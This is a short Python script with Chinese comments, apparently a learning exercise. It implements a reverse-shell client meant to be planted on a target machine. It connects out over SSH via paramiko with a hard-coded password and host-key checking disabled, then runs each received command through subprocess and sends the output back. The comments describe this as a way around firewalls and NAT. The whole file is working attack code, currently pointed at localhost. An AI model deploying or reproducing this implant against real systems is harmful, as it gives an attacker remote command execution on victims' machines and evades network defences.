# 这个客户端用于发起连接后，接收数据并执行shell命令，然后把结果传给服务器。
# 所以，这是一个部署在目标身上的客户端，用来反弹shell  

# 为什么要反弹shell？
#   1.对目标发出连接请求需要跨过各种防火墙、代理、NAT等设备，有可能连接不上或受限，可能目标策略仅允许自己发出连接请求
#   2.目标的可连接端口可能被占用


import paramiko
import shlex
import subprocess
import sys
import os




current_module_dirname = os.path.dirname(os.path.realpath(__file__))
#HOSTKEY_PATH = os.path.join(current_module_dirname, 'kgkey.pub')
#PRIVATEKEY_PATH = os.path.join(current_module_dirname, 'kgkey')
#KNOWN_HOSTS = os.path.join(current_module_dirname, 'known_hosts')



if __name__ == '__main__':

    server_ip = '127.0.0.1'
    server_port = 2222
    user = 'kygoss'
    passwd = '123456'
    #pkey = paramiko.RSAKey.from_private_key_file(PRIVATEKEY_PATH)
    #key = paramiko.RSAKey.from_private_key_file(HOSTKEY_PATH)


    client = paramiko.SSHClient()
    #client.load_host_keys(HOSTKEY_PATH)
    #client.load_system_host_keys()
    #client.get_host_keys().add('server_ip', 'ssh-rsa', pkey)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)#放弃密钥认证，使用密码认证
    client.connect(hostname=server_ip, port=server_port, username=user, password=passwd)
    session = client.get_transport().open_session()
    print('session over!')


    if session.active:
        session.settimeout(5)
        try:
            session.send(b'hello')
        except:
            print('can not send')
            sys.exit()
        while True:
            session.settimeout(10)
            try:
                receive1 = session.recv(4096)
                print('recv over!')
                output = subprocess.check_output(shlex.split(receive1.decode().strip()), stderr=subprocess.STDOUT)
                session.send(output or b'Done!')
            except Exception as e:
                session.send(f'{e}'.encode())
                print({e})
    else:
        print('sessoin not active')
        sys.exit()
